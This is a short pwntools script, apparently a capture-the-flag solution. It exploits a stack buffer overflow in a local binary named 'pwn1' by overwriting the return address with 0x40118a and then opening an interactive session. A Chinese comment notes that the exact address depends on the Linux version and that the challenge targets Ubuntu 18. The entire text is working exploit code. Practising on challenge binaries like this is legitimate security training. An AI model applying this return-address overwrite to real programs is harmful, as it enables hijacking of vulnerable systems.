from pwn import *
io = process("./pwn1")
payload = 'a'*(0xf + 8) + p64(0x40118a)
#具体86还是87/8a要看linux版本，太新的话写86会导致crash，所以题目写了是Ubuntu18
io.sendline(payload)
io.recv()
io.interactive()